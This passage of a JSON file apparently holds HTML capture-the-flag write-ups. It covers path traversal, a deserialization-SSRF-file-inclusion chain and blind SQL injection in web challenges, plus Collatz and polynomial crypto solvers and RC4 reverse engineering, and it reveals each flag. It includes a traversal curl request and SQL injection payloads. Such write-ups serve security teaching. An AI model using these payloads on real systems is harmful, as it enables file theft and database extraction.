<code>....//secret/flag.txt</code>.</li>\n<li><strong>Execution</strong>:</li>\n</ol>\n<p>``<code>bash     curl \"http://104.198.24.52:6012/image?file=....//secret/flag.txt\"     </code>`<code>     Response:     </code>`<code>     flag{sTr1pp1ng_d0Ts_and_SLasH3s_d03sNt_sTr1p_bUgs}     </code>``</p>"
            },
            {
                "id": "marketflow",
                "title": "Marketflow",
                "category": "Web Exploitation",
                "tags": [
                    "rsa",
                    "web",
                    "http"
                ],
                "writeup": "<h4>Vulnerability Analysis</h4>\n<ol>\n<li><strong>Insecure Deserialization:</strong></li>\n</ol>\n<ul>\n<li>The endpoint <code>/api/analytics/reports</code> accepts a JSON payload and processes it using <code>ObjectManager.deserialize</code>.</li>\n<li>This method allows instantiating any class registered in <code>CLASS_REGISTRY</code> with arbitrary constructor arguments.</li>\n<li>This is the entry point for the exploit chain.</li>\n</ul>\n<ol>\n<li><strong>Arbitrary File Write (Gadget Chain):</strong></li>\n</ol>\n<ul>\n<li>The <code>Scheduler</code> processes tasks and, for <code>ReportConfiguration</code> objects, can trigger <code>cache_service.prime(output_config)</code>.</li>\n<li><code>CacheService.prime</code> calls <code>config.persistence.write(data)</code>.</li>\n<li><code>PersistenceAdapter.write</code> (the persistence object) uses <code>os.path.join</code> with user-controlled input. If an absolute path or path traversal (e.g., <code>../</code>) is provided, it can write to unintended locations.</li>\n<li>This allows us to write arbitrary content to files in the writable directories (specifically <code>/var/tmp/sessionmaze/templates</code> via traversal).</li>\n</ul>\n<ol>\n<li><strong>SSRF (Trigger Mechanism):</strong></li>\n</ol>\n<ul>\n<li>The <code>Scheduler</code> only processes tasks when <code>/internal/cron/process</code> is called. This endpoint is restricted to <code>localhost</code>.</li>\n<li>The <code>/api/webhooks/forward</code> endpoint uses <code>WebhookForwarder</code> to make HTTP requests.</li>\n<li>Although there is a protection mechanism (<code>is_safe_url</code>), it can be bypassed using a domain that resolves to 127.0.0.1 (e.g., <code>localtest.me</code>). This allows us to trigger the cron job externally.</li>\n</ul>\n<ol>\n<li><strong>Local File Inclusion (LFI):</strong></li>\n</ol>\n<ul>\n<li>The <code>TemplateRenderer</code> has a \"legacy\" mode for files ending in <code>.tpl</code>.</li>\n<li>If a template contains <code>@config: /path/to/file</code>, the renderer reads that file and includes its content in the output HTML.</li>\n<li>By writing a malicious <code>.tpl</code> file (using the file write vulnerability) and then instructing the application to use it as a template, we can read <code>/flag.txt</code>.</li>\n</ul>\n<h4>Exploit Summary</h4>\n<p>I created and executed an exploit script (<code>exploit.py</code>) that performed the following steps:</p>\n<ol>\n<li><strong>Register & Login:</strong> Created a user to access the authenticated API.</li>\n<li><strong>Stage 1 (Write):</strong> Scheduled a malicious task to write a file named <code>exploit.tpl</code> to <code>../templates/exploit.tpl</code> (which resolves to <code>/var/tmp/sessionmaze/templates/exploit.tpl</code>). The content included <code>@config: /flag.txt</code>.</li>\n<li><strong>Trigger:</strong> Used the SSRF vulnerability to hit <code>http://localtest.me:5000/internal/cron/process</code>, forcing the scheduler to execute the write task.</li>\n<li><strong>Stage 2 (Read):</strong> Scheduled a second task to generate a report using the <code>exploit.tpl</code> template.</li>\n<li><strong>Trigger:</strong> Triggered the scheduler again.</li>\n<li><strong>Retrieve:</strong> Downloaded the generated report. The flag was embedded in an HTML comment within the report.</li>\n</ol>\n<h4>Flag</h4>\n<p><code>flag{n3st3d_d3s3r1al1z4t10n_ssrf_ch41n_c0mpl3t3_0b53wrf}</code></p>"
            },
            {
                "id": "no-sight",
                "title": "No Sight",
                "category": "Web Exploitation",
                "tags": [
                    "sql",
                    "injection"
                ],
                "writeup": "<h3>Reconnaissance</h3>\n<ol>\n<li><strong>Initial Probing</strong>:</li>\n</ol>\n<ul>\n<li>Input <code>1</code> -> \"User found!\"</li>\n<li>Input <code>999999</code> -> \"No user found\"</li>\n</ul>\n<ol>\n<li><strong>Vulnerability Detection</strong>:</li>\n</ol>\n<ul>\n<li>We suspected SQL Injection.</li>\n<li>Input <code>1 AND 1=1</code> -> \"User found!\" (True condition)</li>\n<li>Input <code>1 AND 1=2</code> -> \"No user found\" (False condition)</li>\n<li>This confirmed a <strong>Boolean-based Blind SQL Injection</strong> vulnerability. We can ask the database true/false questions and infer data based on the response.</li>\n</ul>\n<h3>Database Enumeration</h3>\n<ol>\n<li><strong>Identifying the Database</strong>:</li>\n</ol>\n<ul>\n<li>Standard MySQL functions like <code>database()</code> and <code>version()</code> failed or were filtered.</li>\n<li>We tested for SQLite by querying the <code>sqlite_master</code> table.</li>\n<li>Payload: <code>1 AND (SELECT 1 FROM sqlite_master LIMIT 1) = 1</code> -> \"User found!\"</li>\n<li>This confirmed the database is <strong>SQLite</strong>.</li>\n</ul>\n<ol>\n<li><strong>Finding Tables</strong>:</li>\n</ol>\n<ul>\n<li>We knew there was likely a <code>users</code> table.</li>\n<li>To find the flag, we searched for other tables. We checked for a second table in <code>sqlite_master</code>.</li>\n<li>We wrote a Python script using binary search to extract the name of the table that is NOT 'users'.</li>\n<li>Payload logic: <code>1 AND (SELECT SUBSTR(name, 1, 1) FROM sqlite_master WHERE type='table' AND name != 'users' LIMIT 1) &gt; 'char'</code></li>\n<li>The script revealed a table named: <code>secret_flags</code>.</li>\n</ul>\n<ol>\n<li><strong>Finding Columns</strong>:</li>\n</ol>\n<ul>\n<li>We needed to know the column names in <code>secret_flags</code>.</li>\n<li>We extracted the <code>CREATE TABLE</code> SQL statement for the <code>secret_flags</code> table from <code>sqlite_master</code>.</li>\n<li>Payload logic: <code>1 AND (SELECT SUBSTR(sql, 1, 1) FROM sqlite_master WHERE type='table' AND name='secret_flags') &gt; 'char'</code></li>\n<li>The result was:</li>\n</ul>\n<p>``<code>sql         CREATE TABLE secret_flags (             id INTEGER PRIMARY KEY,             flag TEXT NOT NULL         )         </code>``</p>\n<ul>\n<li>This confirmed the target column is <code>flag</code>.</li>\n</ul>\n<h3>Exploitation</h3>\n<ol>\n<li><strong>Extracting the Flag</strong>:</li>\n</ol>\n<ul>\n<li>With the table <code>secret_flags</code> and column <code>flag</code> identified, we wrote a final Python script to extract the flag's content character by character.</li>\n<li>Payload logic: <code>1 AND (SELECT SUBSTR(flag, 1, 1) FROM secret_flags LIMIT 1) &gt; 'char'</code></li>\n<li>The script used binary search for efficiency.</li>\n</ul>\n<h3>Result</h3>\n<p>The extraction script successfully recovered the flag:</p>\n<p><strong>Flag</strong>: <code>flag{bl1nd_but_n0t_l0st_1n_th3_d4rk}</code></p>"
            },
            {
                "id": "peak-conjecture",
                "title": "Peak Conjecture",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "pwn",
                    "reverse"
                ],
                "writeup": "<p>chall.py analysis: The core of the challenge revolved around a function <code>uniqueHash(x)</code> which calculates the number of steps required for <code>x</code> to reach 1 according to the Collatz conjecture (3x+1 problem), with a cap of 10000 steps.</p>\n<p>The server's logic:</p>\n<ol>\n<li>It has a secret <code>message</code> (likely a bytes-to-long converted flag).</li>\n<li>It calculates <code>myHash = uniqueHash(message)</code>.</li>\n<li>It prints <code>uniqueHash(myHash)</code> to the user.</li>\n<li>It then asks the user to input 10 distinct integers <code>x</code> such that:</li>\n</ol>\n<ul>\n<li><code>uniqueHash(x) == myHash</code></li>\n<li><code>isPrime(x) == isPrime(message)</code></li>\n</ul>\n<ol>\n<li>If 10 such numbers are provided, it reveals <code>message</code> (the flag).</li>\n</ol>\n<p>Initial Interaction and Deduction: Upon connecting to the server using <code>nc remote.infoseciitr.in 4002</code>, the server output: \"This is my hash of hash: 25\"</p>\n<p>This means <code>uniqueHash(myHash) = 25</code>. <code>myHash</code> is itself an integer representing a number of Collatz steps. Since <code>uniqueHash(myHash) = 25</code>, it means <code>myHash</code> is an integer that takes 25 steps to reach 1 in the Collatz sequence.</p>\n<p>Strategy:</p>\n<ol>\n<li><strong>Find <code>myHash</code>:</strong> We need to find <code>S</code> such that <code>uniqueHash(S) = 25</code>. Since <code>myHash</code> is a step count, it's likely a relatively small integer (usually < 10000). We can iterate through integers <code>S</code> from 1 to 10000 and calculate <code>uniqueHash(S)</code>. The initial solver script performed this, finding a list of candidates for <code>myHash</code>. The first successful probe revealed <code>myHash = 4017</code>.</li>\n<li><strong>Determine <code>isPrime(message)</code>:</strong> To satisfy <code>isPrime(x) == isPrime(message)</code>, we need to know the primality of <code>message</code>. By sending a known composite number <code>x</code> (e.g., <code>2^4017</code>) that satisfies <code>uniqueHash(x) == 4017</code>, we can observe the server's response.</li>\n</ol>\n<ul>\n<li>If the server says \"Correct!\", <code>isPrime(x)</code> and <code>isPrime(message)</code> are the same. Since <code>x</code> is composite, <code>message</code> is composite.</li>\n<li>If the server says \"Well Well, you failed!\", <code>isPrime(x)</code> and <code>isPrime(message)</code> are different. Since <code>x</code> is composite, <code>message</code> is prime.</li>\n</ul>\n<p>My solver found <code>myHash = 4017</code> and determined that <code>message</code> is prime.</p>\n<ol>\n<li><strong>Generate 10 inputs:</strong> We need to find 10 distinct prime numbers <code>x</code> such that <code>uniqueHash(x) == 4017</code>.</li>\n</ol>\n<p>To do this, we can reverse the Collatz sequence from 1 for <code>4017</code> steps. The reverse operations are:</p>\n<ul>\n<li><code>v -&gt; 2 * v</code> (always valid)</li>\n<li><code>v -&gt; (v - 1) / 3</code> (valid if <code>(v - 1)</code> is divisible by 3 and <code>(v - 1) / 3</code> is odd and greater than 1).</li>\n</ul>\n<p>Since <code>4017</code> steps is a large number, the resulting <code>x</code> values will be very large (thousands of bits long). The density of primes among such large numbers is low (approximately <code>1 / ln(N)</code>). Therefore, we need to generate a large number of candidates and test their primality.</p>\n<p>Solver Implementation: My Python solver script used the <code>pwn</code> library for network interaction and <code>Crypto.Util.number.isPrime</code> for primality testing.</p>\n<p>The key steps in the solver were:</p>\n<ul>\n<li><strong><code>uniqueHash(x)</code> function:</strong> A local re-implementation of the server's Collatz hash function.</li>\n<li><strong><code>generate_inputs(target_steps, beam_width, forbidden)</code> function:</strong> This function generates numbers that have a specific <code>target_steps</code> in their Collatz sequence. It works by starting from 1 and reversing the Collatz operations for <code>target_steps</code> iterations. To handle the exponential growth, it uses a <code>beam_width</code> to limit the number of active paths at each step, taking a random sample if the paths exceed the beam width.</li>\n<li><strong>Pre-calculation of primes:</strong> To avoid server timeouts, the solver first generated <code>myHash</code> (4017) and <code>isPrime(message)</code> (True). Then, it locally generated a large set of candidates using <code>generate_inputs(4017, 60000, [])</code>. From these candidates, it filtered out and stored 10 distinct prime numbers.</li>\n<li><strong>Server Interaction:</strong> After pre-calculating the primes, the solver connected to the remote server, read the initial prompt, and then sent the 10 pre-calculated primes one by one. The server responded with \"Correct!\" for each valid input.</li>\n<li><strong>Flag Retrieval:</strong> After the 10th correct input, the server printed the flag.</li>\n</ul>\n<p>Challenges and Refinements:</p>\n<ul>\n<li><strong><code>Cryptodome</code> vs <code>Crypto</code>:</strong> The <code>chall.py</code> used <code>Cryptodome.Util.number.isPrime</code>, while <code>pycryptodome</code> typically installs as <code>Crypto</code>. This was fixed by changing the import in the solver.</li>\n<li><strong>Server Timeout:</strong> The server seemed to have an idle timeout or processing timeout. Initially, my solver performed the <code>myHash</code> and primality probing, and then the prime generation *after* connecting to the server. This often led to an <code>EOFError</code> because the generation took too long. The solution was to perform all computationally intensive tasks (like generating prime candidates) locally *before* establishing the connection to the remote server.</li>\n<li><strong>Generating Enough Primes:</strong> Finding 10 primes with a specific, large Collatz stopping time requires exploring a wide range of numbers. Initially, my <code>beam_width</code> for candidate generation was too small, yielding fewer than 10 primes. Increasing the <code>beam_width</code> (e.g., to 60000) allowed the generator to produce enough candidates to find the required 10 primes.</li>\n</ul>\n<p>Flag: <code>flag{1r0n_m4n_f0r_c0ll4tz_3ndg4m3_0f_cryp70gr4phy_1s_p34k_r16h7_313}</code></p>"
            },
            {
                "id": "the-job",
                "title": "The Job",
                "category": "Cryptography",
                "tags": [
                    "pwn",
                    "reverse"
                ],
                "writeup": "<p>Phase 1: Balancing the Initial Hash Table</p>\n<ol>\n<li>Understanding the Requirement: The server provided 896 unique numbers and expected a polynomial $P(x)$ whose coefficients we would provide. The hash function was $H(x) = P(x) \\pmod{10^9+7}$. This hash was used to place numbers into 256 slots. The manager demanded that the inputs be \"equally divided,\" meaning the difference in sizes of any two slots should not be 2 or more.</li>\n<li>Determining the Target Distribution: With $N=896$ numbers and $K=256$ slots, the average number of items per slot is $896/256 = 3.5$. To satisfy the \"difference in sizes of any two slots should not be 2 or more\" constraint and the maximum size limit of 4 items per slot (derived from <code>(N+K-1)/K</code> check), the only valid distribution is to have exactly 128 slots containing 3 items and 128 slots containing 4 items.</li>\n<li>Polynomial Construction (Lagrange Interpolation): We needed to find a polynomial $P(x)$ such that for each given number $x_i$ from the leaked <code>number_array</code>, $P(x_i) \\pmod{MOD}$ resulted in a specific target slot index $y_i$. We constructed a mapping where 128 input numbers were assigned to each of the 128 \"size 4\" slots, and 128 input numbers were assigned to each of the 128 \"size 3\" slots. We then used Lagrange Interpolation over a finite field ($MOD = 10^9+7$) to determine the coefficients of this polynomial. The polynomial's degree was $N-1$, which was acceptable. The <code>solve_poly</code> function implemented this, returning the coefficients in a low-to-high degree order, which were then reversed before sending.</li>\n</ol>\n<p>Phase 2: Finding the Hidden Junk Value</p>\n<ol>\n<li>The Twist: After Phase 1, the server revealed that a \"junk\" value was already placed in a random, unknown slot (<code>target</code>). This meant one slot would start with 1 item, and the others with 0. We had 6 trials to find this <code>target</code> index.</li>\n<li>Trial Mechanism: In each trial, we submitted a new polynomial. The server would then check if the hash table, *including the junk value*, was balanced (i.e., no slot had more than 4 items).</li>\n</ol>\n<ul>\n<li>If the <code>target</code> slot (which already had 1 junk item) received 4 additional items from our polynomial, its total count would be 5, causing the server to report \"failed.\"</li>\n<li>If the <code>target</code> slot received 3 additional items from our polynomial, its total count would be 4, causing the server to report \"passed.\"</li>\n</ul>\n<ol>\n<li>Binary Search Strategy: This provided a binary (Pass/Fail) signal. With 256 possible <code>target</code> indices and 6 trials, we could narrow down the possibilities significantly.</li>\n</ol>\n<ul>\n<li>We maintained a <code>candidates</code> list, initially containing all 256 indices.</li>\n<li>In each trial, we split the <code>candidates</code> list into two halves: <code>test_group</code> and <code>rest_group</code>.</li>\n<li>We then constructed a polynomial that assigned 4 items to all slots in the <code>test_group</code> (and padded this group with \"safe\" indices from previous trials to ensure exactly 128 \"size-4\" slots). The remaining slots were assigned 3 items.</li>\n<li>If the server reported \"failed,\" the <code>target</code> was in our <code>test_group</code>.</li>\n<li>If the server reported \"passed,\" the <code>target</code> was in our <code>rest_group</code>.</li>\n<li>This effectively halved the <code>candidates</code> list in each trial: $256 \\to 128 \\to 64 \\to 32 \\to 16 \\to 8 \\to 4$.</li>\n</ul>\n<ol>\n<li>Final Guess: After 6 trials, we were left with 4 candidate indices. Since we had no further information, we simply guessed the first index in the remaining <code>candidates</code> list. This gave us a 1/4 (25%) chance of success for each connection attempt.</li>\n<li>Automation and Retries: The entire process was wrapped in a <code>while True</code> loop to automatically reconnect and retry the challenge until the correct index was guessed and the flag was obtained.</li>\n</ol>\n<p>Execution: The Python script <code>solve.py</code> was executed. It connected to the remote instance, performed the polynomial calculations and interactions for Phase 1 and 2, and eventually succeeded in guessing the correct index.</p>\n<pre><code class=\"python\">\nfrom pwn import *\n\nimport sys\n\nimport time\n\nimport traceback\n\n\n\n# Set context\n\ncontext.log_level = 'info'\n\n\n\nMOD = 10**9 + 7\n\nN = 896\n\nK = 256\n\n\n\ndef solve_poly(inputs, targets):\n\n    n = len(inputs)\n\n    # 1. Compute M(x) = product(x - inputs[i])\n\n    M = [1] \n\n    for x in inputs:\n\n        c = (MOD - x) % MOD\n\n        new_M = [0] * (len(M) + 1)\n\n        for i in range(len(M)):\n\n            new_M[i] = (new_M[i] + M[i] * c) % MOD\n\n            new_M[i+1] = (new_M[i+1] + M[i]) % MOD\n\n        M = new_M\n\n        \n\n    M_deriv = []\n\n    for i in range(1, len(M)):\n\n        M_deriv.append((M[i] * i) % MOD)\n\n        \n\n    w = []\n\n    for x in inputs:\n\n        val = 0\n\n        power_x = 1\n\n        for c in M_deriv:\n\n            val = (val + c * power_x) % MOD\n\n            power_x = (power_x * x) % MOD\n\n        w.append(val)\n\n        \n\n    inv_w = [pow(val, MOD-2, MOD) for val in w]\n\n    \n\n    final_poly = [0] * n \n\n    \n\n    for j in range(n):\n\n        target = targets[j]\n\n        if target == 0: continue # Optimization\n\n        \n\n        scale = (target * inv_w[j]) % MOD\n\n        if scale == 0: continue\n\n            \n\n        c = inputs[j]\n\n        carry = 0 \n\n        for k in range(n, 0, -1):\n\n             val = (M[k] + c * carry) % MOD\n\n             carry = val\n\n             final_poly[k-1] = (final_poly[k-1] + val * scale) % MOD\n\n             \n\n    return final_poly\n\n\n\ndef main():\n\n    while True:\n\n        try:\n\n            # Connect\n\n            log.info(\"Connecting...\")\n\n            r = remote('remote.infoseciitr.in', 4006)\n\n            \n\n            # Read intro\n\n            r.recvuntil(b\"Press Enter to start &gt; \")\n\n            r.sendline(b\"\")\n\n            \n\n            # Read leaked numbers\n\n            r.recvuntil(b\"Here are the leaked numbers : \")\n\n            nums_str = r.recvline().strip().decode()\n\n            number_array = list(map(int, nums_str.split(',')))\n\n            \n\n            log.info(f\"Received {len(number_array)} numbers\")\n\n            \n\n            # Phase 1: Provide balanced hash\n\n            targets = []\n\n            slot_counts = [0] * K\n\n            for i in range(N):\n\n                if i &lt; 512:\n\n                    slot = i // 4\n\n                else:\n\n                    rem = i - 512\n\n                    slot = 128 + (rem // 3)\n\n                targets.append(slot)\n\n                slot_counts[slot] += 1\n\n            \n\n            log.info(\"Computing Phase 1 polynomial...\")\n\n            coeffs = solve_poly(number_array, targets)\n\n            payload = \",\".join(map(str, coeffs[::-1]))\n\n            \n\n            r.sendlineafter(b\"&gt; \", payload.encode())\n\n            \n\n            ret = r.recvuntil(b\"Press Enter to continue &gt; \", timeout=10)\n\n            if b\"Press Enter\" not in ret:\n\n                log.error(\"Phase 1 failed or timed out\")\n\n                log.error(ret.decode())\n\n                r.close()\n\n                continue\n\n                \n\n            log.info(\"Phase 1 success.\")\n\n            r.sendline(b\"\")\n\n            \n\n            # Phase 2: Find the index\n\n            candidates = list(range(K))\n\n            safe_indices = []\n\n            \n\n            for trial in range(6):\n\n                log.info(f\"Trial {trial+1}, Candidates: {len(candidates)}\")\n\n                \n\n                mid = len(candidates) // 2\n\n                test_group = candidates[:mid]\n\n                rest_group = candidates[mid:]\n\n                \n\n                needed = 128 - len(test_group)\n\n                if needed &lt; 0: needed = 0\n\n                padding = safe_indices[:needed]\n\n                \n\n                slots_for_4 = set(test_group + padding)\n\n                # Ensure we have exactly 128\n\n                if len(slots_for_4) != 128:\n\n                    log.warning(f\"Slots for 4 count: {len(slots_for_4)}. Candidates: {len(candidates)}\")\n\n                \n\n                current_slot_counts = {}\n\n                for s in range(K):\n\n                    if s in slots_for_4:\n\n                        current_slot_counts[s] = 4\n\n                    else:\n\n                        current_slot_counts[s] = 3\n\n                        \n\n                target_slots_list = []\n\n                for s in range(K):\n\n                    count = current_slot_counts[s]\n\n                    for _ in range(count):\n\n                        target_slots_list.append(s)\n\n                \n\n                log.info(\"Computing Phase 2 polynomial...\")\n\n                coeffs = solve_poly(number_array, target_slots_list)\n\n                payload = \",\".join(map(str, coeffs[::-1]))\n\n                \n\n                r.sendlineafter(b\"&gt; \", payload.encode())\n\n                \n\n                response = r.recvuntil(b\"\\n\\n\").decode()\n\n                \n\n                if \"passed\" in response:\n\n                    candidates = rest_group\n\n                    safe_indices.extend(test_group)\n\n                else:\n\n                    candidates = test_group\n\n                    safe_indices.extend(rest_group)\n\n            \n\n            log.info(f\"Candidates left: {candidates}\")\n\n            guess = candidates[0]\n\n            log.info(f\"Guessing: {guess}\")\n\n            \n\n            r.sendlineafter(b\"Tell your friend the index : \", str(guess).encode())\n\n            \n\n            final_res = r.recvall(timeout=5).decode()\n\n            print(final_res)\n\n            \n\n            if \"flag\" in final_res.lower() or \"Flag\" in final_res or \"{\" in final_res:\n\n                print(\"FOUND FLAG!\")\n\n                break\n\n            else:\n\n                log.info(\"Failed, retrying...\")\n\n                r.close()\n\n                \n\n        except BaseException as e:\n\n            print(f\"CRITICAL ERROR: {e}\")\n\n            traceback.print_exc()\n\n            try: r.close()\n\n            except: pass\n\n            time.sleep(1)\n\n\n\nif __name__ == \"__main__\":\n\n    main()\n\n</code></pre>\n<p>Flag: <code>flag{h0w_d1d_h3_b3c0m3_th3_m4n4g3r}</code></p>"
            },
            {
                "id": "to_jmp_or_not_jmp",
                "title": "To_jmp_or_not_jmp",
                "category": "Reverse Engineering",
                "tags": [
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse",
                    "assembly",
                    "disassembler",
                    "memory"
                ],
                "writeup": "<h3>1. Challenge Overview</h3>\n<p>The challenge presented a stripped 64-bit ELF executable named <code>challenge</code>. When executed, it prompted for a \"flag\" and responded with \"Wrong! Try again.\" if an incorrect input was provided. The goal was to find the correct flag.</p>\n<h3>2. Initial Analysis</h3>\n<ul>\n<li><strong>File Type:</strong></li>\n</ul>\n<p>``<code>bash     ls -la &amp;&amp; file challenge     </code>`<code>     Output confirmed it was an </code>ELF 64-bit LSB pie executable, x86-64, stripped`. The \"stripped\" nature meant function names were removed, increasing the difficulty of static analysis. \"PIE\" (Position-Independent Executable) indicated that addresses would be relative, requiring careful RIP-relative address calculations.</p>\n<ul>\n<li><strong>Execution:</strong></li>\n</ul>\n<p>``<code>bash     ./challenge     </code>`<code>     Output:     </code>`<code>     Enter the flag: 12345     Wrong! Try again.     </code>``     This confirmed the program's basic interaction.</p>\n<ul>\n<li><strong>Strings Analysis:</strong></li>\n</ul>\n<p>``<code>bash     strings challenge | grep -i flag     </code>`<code>     Output:     </code>`<code>     Enter the flag:     Correct! You got the flag!     </code>``     The presence of \"Correct! You got the flag!\" suggested a comparison logic within the binary that we needed to locate and understand.</p>\n<h3>3. Reverse Engineering - Control Flow Obfuscation</h3>\n<p>The primary challenge in static analysis was the presence of control flow obfuscation using a pattern of <code>je</code> (jump if equal) and <code>jne</code> (jump if not equal) instructions targeting the same address. This effectively created an unconditional jump but confused disassemblers and made linear analysis difficult. For example:</p>\n<pre><code class=\"assembly\">\n    16a9:       74 03                   je     16ae\n\n    16ab:       75 01                   jne    16ae\n\n</code></pre>\n<p>Both instructions would jump to <code>16ae</code>, making <code>16ae</code> the actual next instruction. This pattern required careful manual tracing of the control flow.</p>\n<p>The binary also used dynamic jump targets:</p>\n<ol>\n<li>An address (e.g., <code>0x11c9</code>) was calculated using <code>lea rax, [rip + offset]</code>.</li>\n<li>This address was then stored in a global memory location (e.g., <code>mov QWORD PTR [rip+offset], rax</code>).</li>\n<li>Later, the value from that global memory location was loaded into a register (<code>mov rax, QWORD PTR [rip+offset]</code>).</li>\n<li>Finally, an indirect jump (<code>jmp rax</code>) was used to transfer execution to the calculated address. This made it difficult to follow the flow directly in <code>objdump</code> without careful calculation.</li>\n</ol>\n<p>After tracing the obfuscated entry point (<code>0x10e0</code>) and subsequent jumps, the effective <code>main</code> function started at <code>0x11c9</code>.</p>\n<h3>4. Identifying RC4 Algorithm</h3>\n<p>Inside the <code>main</code> function (starting at <code>0x11c9</code> after initial setup), the following sequence of operations was identified:</p>\n<ul>\n<li><strong>Prompt for Input:</strong> The string \"Enter the flag:\" was printed, followed by a call to <code>std::getline</code> to read user input. The length of the input was stored in a global variable at <code>0x44a0</code>.</li>\n<li><strong>S-box Initialization (KSA Phase 1):</strong> A loop from <code>0</code> to <code>255</code> initialized a 256-byte array (likely the S-box for RC4) with <code>S[i] = i</code>. This array was located in the <code>.bss</code> section (uninitialized data), eventually mapped to virtual address <code>0x4280</code>.</li>\n<li><strong>Key Scheduling Algorithm (KSA Phase 2):</strong> A second loop (from <code>i=0</code> to <code>255</code>) performed the key-dependent scrambling of the S-box. The logic closely matched the standard RC4 KSA:</li>\n</ul>\n<p>``<code>     j = (j + S[i] + key_byte) % 256     swap(S[i], S[j])     </code>``</p>\n<ul>\n<li><strong>Pseudo-Random Generation Algorithm (PRGA):</strong> After the KSA, a third loop iterated for the length of the user's input. In each iteration, it generated a keystream byte and XORed it with a byte of the user's input. The standard RC4 PRGA was identified:</li>\n</ul>\n<p>``<code>     i = (i + 1) % 256     j = (j + S[i]) % 256     swap(S[i], S[j])     K = S[(S[i] + S[j]) % 256]     encrypted_input_byte = input_byte ^ K     </code>`<code>     The results of this XOR operation (the \"encrypted\" user input) were stored in a buffer at </code>0x4420`.</p>\n<ul>\n<li><strong>Comparison:</strong> Finally, the \"encrypted\" user input (from <code>0x4420</code>) was compared byte-by-byte with a pre-stored ciphertext.</li>\n<li>If all bytes matched, the program jumped to a block that printed \"Correct! You got the flag!\" (identified by tracing a <code>lea</code> instruction to <code>0x20a1</code> in <code>.rodata</code>).</li>\n<li>If any byte mismatched, it jumped to a block that printed \"Wrong! Try again.\"</li>\n</ul>\n<p>This confirmed that the challenge involved an RC4-encrypted flag, and we needed to reverse the encryption by finding the key and the pre-stored ciphertext.</p>\n<h3>5. Extracting RC4 Parameters</h3>\n<h4>a. Key Identification</h4>\n<ul>\n<li>During KSA analysis, an instruction <code>lea rdx,[rip+0xccd]</code> was found, which resolved to address <code>0x2020</code>. This address was within the <code>.rodata</code> section, indicating it was a constant string.</li>\n<li>A modulo operation <code>(i % 15)</code> was used to index into this data, suggesting a key length of 15.</li>\n<li>Dumping 15 bytes from <code>0x2020</code> in the <code>challenge</code> binary:</li>\n</ul>\n<p>``<code>bash     dd if=challenge bs=1 skip=$((0x2020)) count=15 2&gt;/dev/null | hexdump -C     </code>`<code>     Output:     </code>`<code>     00000000  21 61 31 20 61 26 0d 39  61 2b 0d 20 31 66 73     |!a1 a&amp;.9a+. 1fs|     </code>`<code>     The key bytes were </code>21 61 31 20 61 26 0d 39 61 2b 0d 20 31 66 73<code>. Note that </code>0d<code> is Carriage Return (</code>\\r<code>), not a period (</code>.<code>). The string representation is </code>!a1 a&\\r9a+\\r 1fs`.</p>\n<h4>b. Key Modification</h4>\n<ul>\n<li>A critical instruction <code>xor eax, 0x52</code> was discovered immediately after fetching a key byte <code>key[i % key_len]</code> and before it was added to <code>j</code> in the KSA. This meant each key byte was XORed with <code>0x52</code> during the KSA process.</li>\n</ul>\n<h4>c. Ciphertext Identification</h4>\n<ul>\n<li>The comparison loop read from a location at <code>0x2040</code>. This address was also within <code>.rodata</code>, indicating it was the static ciphertext of the flag.</li>\n<li>Dumping bytes from <code>0x2040</code> (initially 64 bytes, then extended to 66 when the flag revealed its full length):</li>\n</ul>\n<p>``<code>bash     dd if=challenge bs=1 skip=$((0x2040)) count=66 2&gt;/dev/null | hexdump -C     </code>`<code>     Output:     </code>`<code>     00000000  8f 36 cf 7d 04 8e 35 ac  0f e8 3f 53 8b 87 ac 26  |.6.}..5...?S...&amp;|     00000010  18 5b 13 c7 ff a6 1d 92  29 b7 62 af a9 b0 cf 74  |.[......).b....t|     00000020  d2 99 4e 55 47 a9 77 3b  67 28 cb 52 74 90 47 24  |..NUG.w;g(.Rt.G$|     00000030  15 94 e1 4e 4d f2 57 ad  7f 5d 22 17 05 08 8b 2a  |...NM.W..\"....*|     00000040  ed f1                                            |..              |     </code>`<code>     The ciphertext bytes are </code>8f 36 cf 7d 04 8e 35 ac 0f e8 3f 53 8b 87 ac 26 18 5b 13 c7 ff a6 1d 92 29 b7 62 af a9 b0 cf 74 d2 99 4e 55 47 a9 77 3b 67 28 cb 52 74 90 47 24 15 94 e1 4e 4d f2 57 ad 7f 5d 22 17 05 08 8b 2a ed f1`.</p>\n<h3>6. Decryption</h3>\n<p>A Python script <code>solve.py</code> was written to implement the RC4 algorithm with the identified key and ciphertext, including the key modification step.</p>\n<pre><code class=\"python\">\ndef rc4_ksa(key_bytes):\n\n    S = list(range(256))\n\n    j = 0\n\n    key_len = len(key_bytes)\n\n    for i in range(256):\n\n        # Apply the modification found in analysis: XOR key byte with 0x52\n\n        modified_key_byte = key_bytes[i % key_len] ^ 0x52\n\n        j = (j + S[i] + modified_key_byte) % 256\n\n        S[i], S[j] = S[j], S[i]\n\n    return S\n\n\n\ndef rc4_prga(S, data_len):\n\n    i = 0\n\n    j = 0\n\n    keystream = []\n\n    # Create a copy of S for PRGA so KSA S-box is not modified\n\n    S_prga = list(S) \n\n    for _ in range(data_len):\n\n        i = (i + 1) % 256\n\n        j = (j + S_prga[i]) % 256\n\n        S_prga[i], S_prga[j] = S_prga[j], S_prga[i]\n\n        K = S_prga[(S_prga[i] + S_prga[j]) % 256]\n\n        keystream.append(K)\n\n    return keystream\n\n\n\n# Key bytes derived from hexdump, including 0x0d for Carriage Return\n\nkey_hex_str = \"21 61 31 20 61 26 0d 39 61 2b 0d 20 31 66 73\"\n\nkey_bytes = [int(b, 16) for b in key_hex_str.split()]\n\n\n\n# Ciphertext bytes from 0x2040\n\nciphertext_hex = \"8f 36 cf 7d 04 8e 35 ac 0f e8 3f 53 8b 87 ac 26 18 5b 13 c7 ff a6 1d 92 29 b7 62 af a9 b0 cf 74 d2 99 4e 55 47 a9 77 3b 67 28 cb 52 74 90 47 24 15 94 e1 4e 4d f2 57 ad 7f 5d 22 17 05 08 8b 2a ed f1\"\n\nciphertext = bytes.fromhex(ciphertext_hex.replace(\" \", \"\"))\n\n\n\nS_ksa = rc4_ksa(key_bytes)\n\nkeystream = rc4_prga(S_ksa, len(ciphertext))\n\n\n\ndecrypted_bytes = []\n\nfor c, k in zip(ciphertext, keystream):\n\n    decrypted_bytes.append(c ^ k)\n\n\n\nprint(\"Decrypted bytes:\", decrypted_bytes)\n\nprint(\"Decrypted string:\", bytes(decrypted_bytes))\n\n</code></pre>\n<p>Running <code>python3 